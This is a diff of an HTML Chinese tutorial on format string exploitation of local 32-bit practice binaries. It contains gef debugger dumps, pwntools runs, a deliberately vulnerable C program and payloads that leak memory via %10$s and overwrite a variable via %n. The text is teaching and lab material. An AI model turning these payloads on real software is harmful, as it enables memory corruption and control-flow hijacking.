-[#1] 0xf7e45977 → printf_positional(s=0xf7fb6d60 &lt;_IO_2_1_stdout_&gt;, format=0xffffd008 "%10$s", readonly_format=0x0, ap=<optimized out="">, ap_savep=0xffffcb7c, done=0x0, nspecs_done=0x0, lead_str_end=0xffffd008 "%10$s", work_buffer=0xffffcbb8 "@\001", save_errno=0x0, grouping=0x0, thousands_sep=0xf7f5f7d2 "")
-[#2] 0xf7e46401 → _IO_vfprintf_internal(s=0xf7fb6d60 &lt;_IO_2_1_stdout_&gt;, format=<optimized out="">, ap=0xffffcfe4 "\b\320\377\377\030\331\377\367\377\265", <incomplete sequence="" \360="">)
+[#1] 0xf7e45977 → printf_positional(s=0xf7fb6d60 <_IO_2_1_stdout_>, format=0xffffd008 "%10$s", readonly_format=0x0, ap=<optimized out>, ap_savep=0xffffcb7c, done=0x0, nspecs_done=0x0, lead_str_end=0xffffd008 "%10$s", work_buffer=0xffffcbb8 "@\001", save_errno=0x0, grouping=0x0, thousands_sep=0xf7f5f7d2 "")
+[#2] 0xf7e46401 → _IO_vfprintf_internal(s=0xf7fb6d60 <_IO_2_1_stdout_>, format=<optimized out>, ap=0xffffcfe4 "\b\320\377\377\030\331\377\367\377\265", <incomplete sequence \360>)
 [#3] 0xf7e4d696 → __printf(format=0xffffd008 "%10$s")
 [#4] 0x804852c → main()
 
@@ -1187,7 +1187,7 @@ Start      End        Offset     Perm Path
 0xfffdd000 0xffffe000 0x00000000 rw- [stack]
 
 gef➤  x/x 0x24303125
-0x24303125:    Cannot access memory at address 0x24303125<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></incomplete></optimized></optimized></printf_positional+7575></printf_positional+7575></code></pre>
+0x24303125:    Cannot access memory at address 0x24303125<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>显然0xffffd008处所对应的格式化字符串所对应的变量值0x24303125并不能够被该程序访问，所以程序自然就崩溃了。</p>
 <p>那么如果我们设置一个可以访问的地址呢？比如说scanf@got，结果会怎么样呢？应该自然是输出scanf对应的地址了。我们不妨来试一下。</p>
 <p>首先，获取scanf@got的地址，如下</p>
@@ -1223,7 +1223,7 @@ Breakpoint 1, __printf (format=0x80485d3 "%08x.%08x.%08x.%s\n") at printf.c:28
 28    printf.c: No such file or directory.
 [ Legend: Modified register | Code | Heap | Stack | String ]
 ───────────────────────────────────────────────────────────────── registers ────
-$eax   : 0xff8ccbd8  →  0x0804a018  →  0xf7dc60c0  →  &lt;__isoc99_scanf+0&gt; push ebp
+$eax   : 0xff8ccbd8  →  0x0804a018  →  0xf7dc60c0  →  <__isoc99_scanf+0> push ebp
 $ebx   : 0x0       
 $ecx   : 0x1       
 $edx   : 0xf7f1d87c  →  0x00000000
@@ -1231,7 +1231,7 @@ $esp   : 0xff8ccb9c  →  0x0804851d  →  <main+98> add esp, 0x20
 $ebp   : 0xff8ccc48  →  0x00000000
 $esi   : 0xf7f1c000  →  0x001b1db0
 $edi   : 0xf7f1c000  →  0x001b1db0
-$eip   : 0xf7db3670  →  <printf+0> call 0xf7e89b59 &lt;__x86.get_pc_thunk.ax&gt;
+$eip   : 0xf7db3670  →  <printf+0> call 0xf7e89b59 <__x86.get_pc_thunk.ax>
 $eflags: [carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
 $cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
 ───────────────────────────────────────────────────────────────────── stack ────
@@ -1240,20 +1240,20 @@ $cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
 0xff8ccba4│+0x0008: 0x00000001
 0xff8ccba8│+0x000c: 0x22222222
 0xff8ccbac│+0x0010: 0xffffffff
-0xff8ccbb0│+0x0014: 0xff8ccbd8  →  0x0804a018  →  0xf7dc60c0  →  &lt;__isoc99_scanf+0&gt; push ebp
-0xff8ccbb4│+0x0018: 0xff8ccbd8  →  0x0804a018  →  0xf7dc60c0  →  &lt;__isoc99_scanf+0&gt; push ebp
+0xff8ccbb0│+0x0014: 0xff8ccbd8  →  0x0804a018  →  0xf7dc60c0  →  <__isoc99_scanf+0> push ebp
+0xff8ccbb4│+0x0018: 0xff8ccbd8  →  0x0804a018  →  0xf7dc60c0  →  <__isoc99_scanf+0> push ebp
 0xff8ccbb8│+0x001c: 0xf7f63918  →  0x00000000
 ─────────────────────────────────────────────────────────────── code:x86:32 ────
    0xf7db3667 <fprintf+23>     inc    DWORD PTR [ebx+0x66c31cc4]
    0xf7db366d                  nop    
    0xf7db366e                  xchg   ax, ax
- → 0xf7db3670 <printf+0>       call   0xf7e89b59 &lt;__x86.get_pc_thunk.ax&gt;
-   ↳  0xf7e89b59 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]
-      0xf7e89b5c &lt;__x86.get_pc_thunk.ax+3&gt; ret    
-      0xf7e89b5d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]
-      0xf7e89b60 &lt;__x86.get_pc_thunk.dx+3&gt; ret    
-      0xf7e89b61 &lt;__x86.get_pc_thunk.si+0&gt; mov    esi, DWORD PTR [esp]
-      0xf7e89b64 &lt;__x86.get_pc_thunk.si+3&gt; ret    
+ → 0xf7db3670 <printf+0>       call   0xf7e89b59 <__x86.get_pc_thunk.ax>
+   ↳  0xf7e89b59 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]
+      0xf7e89b5c <__x86.get_pc_thunk.ax+3> ret    
+      0xf7e89b5d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]
+      0xf7e89b60 <__x86.get_pc_thunk.dx+3> ret    
+      0xf7e89b61 <__x86.get_pc_thunk.si+0> mov    esi, DWORD PTR [esp]
+      0xf7e89b64 <__x86.get_pc_thunk.si+3> ret    
 ─────────────────────────────────────────────────────── arguments (guessed) ────
 __x86.get_pc_thunk.ax (
 )
@@ -1262,7 +1262,7 @@ __x86.get_pc_thunk.ax (
 ───────────────────────────────────────────────────────────────────── trace ────
 [#0] 0xf7db3670 → __printf(format=0x80485d3 "%08x.%08x.%08x.%s\n")
 [#1] 0x804851d → main()
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></printf+0></fprintf+23></main+98></printf+0></main+98></code></pre>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>同时，在我们运行的terminal下</p>
 <pre class="line-numbers language-shell"><code class="language-shell">devil@ubuntu:~$ python exp.py
 [+] Starting local process './leakmemory': pid 2673
@@ -1324,7 +1324,7 @@ Traceback (most recent call last):
   File "/usr/local/lib/python2.7/dist-packages/pwnlib/tubes/process.py", line 707, in recv_raw
     raise EOFError
 EOFError
-[*] Process './leakmemory' stopped with exit code -11 (SIGSEGV) (pid 2747)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></module></code></pre>
+[*] Process './leakmemory' stopped with exit code -11 (SIGSEGV) (pid 2747)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>栈上的值如下</p>
 <pre class="line-numbers language-shell"><code class="language-shell">gef➤  c
 Continuing.
@@ -1341,7 +1341,7 @@ $esp   : 0xffc82d1c  →  0x0804851d  →  <main+98> add esp, 0x20
 $ebp   : 0xffc82dc8  →  0x00000000
 $esi   : 0xf7ec9000  →  0x001b1db0
 $edi   : 0xf7ec9000  →  0x001b1db0
-$eip   : 0xf7d60670  →  <printf+0> call 0xf7e36b59 &lt;__x86.get_pc_thunk.ax&gt;
+$eip   : 0xf7d60670  →  <printf+0> call 0xf7e36b59 <__x86.get_pc_thunk.ax>
 $eflags: [carry parity ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
 $cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
 ───────────────────────────────────────────────────────────────────── stack ────
@@ -1357,13 +1357,13 @@ $cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
    0xf7d60667 <fprintf+23>     inc    DWORD PTR [ebx+0x66c31cc4]
    0xf7d6066d                  nop    
    0xf7d6066e                  xchg   ax, ax
- → 0xf7d60670 <printf+0>       call   0xf7e36b59 &lt;__x86.get_pc_thunk.ax&gt;
-   ↳  0xf7e36b59 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]
-      0xf7e36b5c &lt;__x86.get_pc_thunk.ax+3&gt; ret    
-      0xf7e36b5d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]
-      0xf7e36b60 &lt;__x86.get_pc_thunk.dx+3&gt; ret    
-      0xf7e36b61 &lt;__x86.get_pc_thunk.si+0&gt; mov    esi, DWORD PTR [esp]
-      0xf7e36b64 &lt;__x86.get_pc_thunk.si+3&gt; ret    
+ → 0xf7d60670 <printf+0>       call   0xf7e36b59 <__x86.get_pc_thunk.ax>
+   ↳  0xf7e36b59 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]
+      0xf7e36b5c <__x86.get_pc_thunk.ax+3> ret    
+      0xf7e36b5d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]
+      0xf7e36b60 <__x86.get_pc_thunk.dx+3> ret    
+      0xf7e36b61 <__x86.get_pc_thunk.si+0> mov    esi, DWORD PTR [esp]
+      0xf7e36b64 <__x86.get_pc_thunk.si+3> ret    
 ─────────────────────────────────────────────────────── arguments (guessed) ────
 __x86.get_pc_thunk.ax (
 )
@@ -1371,7 +1371,7 @@ __x86.get_pc_thunk.ax (
 [#0] Id 1, Name: "leakmemory", stopped 0xf7d60670 in __printf (), reason: BREAKPOINT
 ───────────────────────────────────────────────────────────────────── trace ────
 [#0] 0xf7d60670 → __printf(format=0x80485d3 "%08x.%08x.%08x.%s\n")
-[#1] 0x804851d → main()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></printf+0></fprintf+23></main+98></printf+0></main+98></code></pre>
+[#1] 0x804851d → main()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>可见程序并没有如同预期一样输出printf的地址。</p>
 <p>有时候，我们需要对我们输入的格式化字符串进行填充，来使得我们想要打印的地址内容位于机器字长整数倍的地址处，一般来说，类似于下面的这个样子。</p>
 <pre><code>[padding][addr]</code></pre><p>注意</p>
@@ -1398,7 +1398,7 @@ $esp   : 0xffffc4ec  →  0xf7e45977  →  <printf_positional+7575> add esp, 0x1
 $ebp   : 0xffffca98  →  0xffffcfb8  →  0xffffd078  →  0x00000000
 $esi   : 0xffffc680  →  0xffffffff
 $edi   : 0xf7fb6d60  →  0xfbad2a84
-$eip   : 0xf7e795f1  →  &lt;__strlen_ia32+49&gt; mov ecx, DWORD PTR [eax]
+$eip   : 0xf7e795f1  →  <__strlen_ia32+49> mov ecx, DWORD PTR [eax]
 $eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
 $cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
 ───────────────────────────────────────────────────────────────────── stack ────
@@ -1411,33 +1411,33 @@ $cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
 0xffffc504│+0x0018: 0x00000000
 0xffffc508│+0x001c: 0x00000000
 ─────────────────────────────────────────────────────────────── code:x86:32 ────
-   0xf7e795e7 &lt;__strlen_ia32+39&gt; xor    BYTE PTR [edi], cl
-   0xf7e795e9 &lt;__strlen_ia32+41&gt; test   BYTE PTR [eax+0x40000000], cl
-   0xf7e795ef &lt;__strlen_ia32+47&gt; xor    edx, edx
- → 0xf7e795f1 &lt;__strlen_ia32+49&gt; mov    ecx, DWORD PTR [eax]
-   0xf7e795f3 &lt;__strlen_ia32+51&gt; add    eax, 0x4
-   0xf7e795f6 &lt;__strlen_ia32+54&gt; sub    edx, ecx
-   0xf7e795f8 &lt;__strlen_ia32+56&gt; add    ecx, 0xfefefeff
-   0xf7e795fe &lt;__strlen_ia32+62&gt; dec    edx
-   0xf7e795ff &lt;__strlen_ia32+63&gt; jae    0xf7e79659 &lt;__strlen_ia32+153&gt;
+   0xf7e795e7 <__strlen_ia32+39> xor    BYTE PTR [edi], cl
+   0xf7e795e9 <__strlen_ia32+41> test   BYTE PTR [eax+0x40000000], cl
+   0xf7e795ef <__strlen_ia32+47> xor    edx, edx
+ → 0xf7e795f1 <__strlen_ia32+49> mov    ecx, DWORD PTR [eax]
+   0xf7e795f3 <__strlen_ia32+51> add    eax, 0x4
+   0xf7e795f6 <__strlen_ia32+54> sub    edx, ecx
+   0xf7e795f8 <__strlen_ia32+56> add    ecx, 0xfefefeff
+   0xf7e795fe <__strlen_ia32+62> dec    edx
+   0xf7e795ff <__strlen_ia32+63> jae    0xf7e79659 <__strlen_ia32+153>
 ─────────────────────────────────────────────────────────────────── threads ────
 [#0] Id 1, Name: "leakmemory", stopped 0xf7e795f1 in __strlen_ia32 (), reason: SIGSEGV
 ───────────────────────────────────────────────────────────────────── trace ────
 [#0] 0xf7e795f1 → __strlen_ia32()
-[#1] 0xf7e45977 → printf_positional(s=0xf7fb6d60 &lt;_IO_2_1_stdout_&gt;, format=0xffffd008 "\\\\x0c\\\\xa0\\\\x04\\\\x08%10$s", readonly_format=0x0, ap=<optimized out="">, ap_savep=0xffffcb7c, done=0x14, nspecs_done=0x0, lead_str_end=0xffffd01c "%10$s", work_buffer=0xffffcbb8 "@\001", save_errno=0x0, grouping=0x0, thousands_sep=0xf7f5f7d2 "")
-[#2] 0xf7e46401 → _IO_vfprintf_internal(s=0xf7fb6d60 &lt;_IO_2_1_stdout_&gt;, format=<optimized out="">, ap=0xffffcfe4 "\b\320\377\377\030\331\377\367\377\265", <incomplete sequence="" \360="">)
+[#1] 0xf7e45977 → printf_positional(s=0xf7fb6d60 <_IO_2_1_stdout_>, format=0xffffd008 "\\\\x0c\\\\xa0\\\\x04\\\\x08%10$s", readonly_format=0x0, ap=<optimized out>, ap_savep=0xffffcb7c, done=0x14, nspecs_done=0x0, lead_str_end=0xffffd01c "%10$s", work_buffer=0xffffcbb8 "@\001", save_errno=0x0, grouping=0x0, thousands_sep=0xf7f5f7d2 "")
+[#2] 0xf7e46401 → _IO_vfprintf_internal(s=0xf7fb6d60 <_IO_2_1_stdout_>, format=<optimized out>, ap=0xffffcfe4 "\b\320\377\377\030\331\377\367\377\265", <incomplete sequence \360>)
 [#3] 0xf7e4d696 → __printf(format=0xffffd008 "\\\\x0c\\\\xa0\\\\x04\\\\x08%10$s")
 [#4] 0x804852c → main()
 ────────────────────────────────────────────────────────────────────────────────
 gef➤  x/x 0xffffd008
-0xffffd008:    0x30785c5c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></incomplete></optimized></optimized></printf_positional+7575></printf_positional+7575></code></pre>
+0xffffd008:    0x30785c5c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h3 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h3><p>上面，我们已经展示了如何利用格式化字符串来泄露栈内存以及任意地址内存，那么我们有没有可能修改栈上变量的值呢，甚至修改任意地址变量的内存呢? 答案是可行的，只要变量对应的地址可写，我们就可以利用格式化字符串来修改其对应的数值。这里我们可以想一下格式化字符串中的类型</p>
 <blockquote>
 <p>%n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</p>
 </blockquote>
 <p>通过这个类型参数，再加上一些小技巧，我们就可以达到我们的目的，这里仍然分为两部分，<strong>一部分为覆盖栈上的变量，第二部分为覆盖指定地址的变量</strong>。</p>
 <p>这里我们给出如下的程序来介绍相应的部分。</p>
-<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
+<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
 <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">456</span><span class="token punctuation">;</span>
 <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
   <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token number">789</span><span class="token punctuation">;</span>
@@ -1492,7 +1492,7 @@ $esp   : 0xffffcfec  →  0x080484c8  →  <main+61> add esp, 0x10
 $ebp   : 0xffffd078  →  0x00000000
 $esi   : 0xf7fb6000  →  0x001b1db0
 $edi   : 0xf7fb6000  →  0x001b1db0
-$eip   : 0xf7e4d670  →  <printf+0> call 0xf7f23b59 &lt;__x86.get_pc_thunk.ax&gt;
+$eip   : 0xf7e4d670  →  <printf+0> call 0xf7f23b59 <__x86.get_pc_thunk.ax>
 $eflags: [carry parity ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
 $cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
 ───────────────────────────────────────────────────────────────────── stack ────
@@ -1508,13 +1508,13 @@ $cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
    0xf7e4d667 <fprintf+23>     inc    DWORD PTR [ebx+0x66c31cc4]
    0xf7e4d66d                  nop    
    0xf7e4d66e                  xchg   ax, ax
- → 0xf7e4d670 <printf+0>       call   0xf7f23b59 &lt;__x86.get_pc_thunk.ax&gt;
-   ↳  0xf7f23b59 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]
-      0xf7f23b5c &lt;__x86.get_pc_thunk.ax+3&gt; ret    
-      0xf7f23b5d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]
-      0xf7f23b60 &lt;__x86.get_pc_thunk.dx+3&gt; ret    
-      0xf7f23b61 &lt;__x86.get_pc_thunk.si+0&gt; mov    esi, DWORD PTR [esp]
-      0xf7f23b64 &lt;__x86.get_pc_thunk.si+3&gt; ret    
+ → 0xf7e4d670 <printf+0>       call   0xf7f23b59 <__x86.get_pc_thunk.ax>
+   ↳  0xf7f23b59 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]
+      0xf7f23b5c <__x86.get_pc_thunk.ax+3> ret    
+      0xf7f23b5d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]
+      0xf7f23b60 <__x86.get_pc_thunk.dx+3> ret    
+      0xf7f23b61 <__x86.get_pc_thunk.si+0> mov    esi, DWORD PTR [esp]
+      0xf7f23b64 <__x86.get_pc_thunk.si+3> ret    
 ─────────────────────────────────────────────────────── arguments (guessed) ────
 __x86.get_pc_thunk.ax (
 )
@@ -1522,7 +1522,7 @@ __x86.get_pc_thunk.ax (
 [#0] Id 1, Name: "overflow", stopped 0xf7e4d670 in __printf (), reason: BREAKPOINT
 ───────────────────────────────────────────────────────────────────── trace ────
 [#0] 0xf7e4d670 → __printf(format=0x80485c3 "%p\n")
-[#1] 0x80484c8 → main()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></printf+0></fprintf+23></handle_intel+107></main+61></printf+0></main+61></code></pre>
+[#1] 0x80484c8 → main()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>可以发现在0xffffcff4处存储着变量c的数值(789==0x315)。继而，我们再确定格式化字符串’%d%d’的地址0xffffd008相对于printf函数的格式化字符串参数0xffffcff0的偏移为0x18，即格式化字符串地址相当于printf函数的第7个参数(0xffffcfec是printf函数的返回地址)，相当于格式化字符串的第6个参数。</p>
 <h5 id="进行覆盖"><a href="#进行覆盖" class="headerlink" title="进行覆盖"></a>进行覆盖</h5><p>这样，第 6 个参数处的值就是存储变量 c 的地址，我们便可以利用 %n 的特征来修改 c 的值。payload 如下</p>
 <pre><code>[address of c]%012d%6$n</code></pre><p>address of c的长度为4(32位程序)，故而我们得再输入12个字符才可以达到16个字符，以便来修改c的值为16。</p>
@@ -1546,7 +1546,7 @@ forc<span class="token punctuation">(</span><span class="token punctuation">)</s
 <blockquote>
 <p>我用这个脚本去打我上面编译出来的程序，发现c_addr一直接收不了，因为在printf(“%p\n”,&amp;c);之前有一个scanf()语句，我发现就算是先send()一个数值也接收不到…于是我又用他的脚本编译了一次。</p>
 </blockquote>
-<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
+<pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
 <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">456</span><span class="token punctuation">;</span>
 <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
   <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token number">789</span><span class="token punctuation">;</span>
@@ -1565,21 +1565,21 @@ forc<span class="token punctuation">(</span><span class="token punctuation">)</s
 <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <blockquote>
 <p>关于pwntools里面的recvuntil脚本</p>
-<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> t <span class="token operator">=</span> tube<span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> t<span class="token punctuation">.</span>recv_raw <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">:</span> b<span class="token string">"Hello World!"</span>
-<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> t<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>b<span class="token string">' '</span><span class="token punctuation">)</span>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> t <span class="token operator">=</span> tube<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token operator">>></span><span class="token operator">></span> t<span class="token punctuation">.</span>recv_raw <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">:</span> b<span class="token string">"Hello World!"</span>
+<span class="token operator">>></span><span class="token operator">></span> t<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>b<span class="token string">' '</span><span class="token punctuation">)</span>
 b<span class="token string">'Hello '</span>
-<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> _<span class="token operator">=</span>t<span class="token punctuation">.</span>clean<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
-<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token comment" spellcheck="true"># Matches on 'o' in 'Hello'</span>
-<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> t<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token punctuation">(</span>b<span class="token string">' '</span><span class="token punctuation">,</span>b<span class="token string">'W'</span><span class="token punctuation">,</span>b<span class="token string">'o'</span><span class="token punctuation">,</span>b<span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token operator">>></span><span class="token operator">></span> _<span class="token operator">=</span>t<span class="token punctuation">.</span>clean<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+<span class="token operator">>></span><span class="token operator">></span> <span class="token comment" spellcheck="true"># Matches on 'o' in 'Hello'</span>
+<span class="token operator">>></span><span class="token operator">></span> t<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token punctuation">(</span>b<span class="token string">' '</span><span class="token punctuation">,</span>b<span class="token string">'W'</span><span class="token punctuation">,</span>b<span class="token string">'o'</span><span class="token punctuation">,</span>b<span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 b<span class="token string">'Hello'</span>
-<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> _<span class="token operator">=</span>t<span class="token punctuation">.</span>clean<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
-<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token comment" spellcheck="true"># Matches expressly full string</span>
-<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> t<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>b<span class="token string">' Wor'</span><span class="token punctuation">)</span>
+<span class="token operator">>></span><span class="token operator">></span> _<span class="token operator">=</span>t<span class="token punctuation">.</span>clean<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
